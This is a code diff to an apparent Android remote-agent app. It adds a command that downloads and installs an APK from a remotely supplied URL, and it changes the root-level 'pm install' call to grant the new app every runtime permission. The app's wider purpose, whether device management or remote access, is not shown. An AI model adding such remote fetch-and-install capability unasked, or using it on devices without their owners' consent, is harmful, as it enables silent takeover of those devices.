@@ -1,10 +1,13 @@
 package com.remoteagent
 
+import android.content.Context
 import com.remoteagent.model.Command
 
 class CommandExecutor(
+    context: Context,
     private val rootExecutor: RootExecutor = RootExecutor(),
     private val screenCapture: ScreenCapture = ScreenCapture(),
+    private val apkInstaller: ApkInstaller = ApkInstaller(context),
 ) {
 
     fun execute(command: Command): ExecutionResult {
@@ -53,7 +56,16 @@ class CommandExecutor(
                 if (apkPath.isNullOrBlank()) {
                     ExecutionResult(success = false, output = "Missing payload.apkPath")
                 } else {
-                    rootExecutor.execute("pm install -r \"$apkPath\"")
+                    rootExecutor.execute("pm install -r -g \"$apkPath\"")
+                }
+            }
+
+            "INSTALL_FROM_URL" -> {
+                val url = payloadString(command, "url")
+                if (url.isNullOrBlank()) {
+                    ExecutionResult(success = false, output = "Missing payload.url")
+                } else {
+                    apkInstaller.installFromUrl(url)
                 }
             }
 
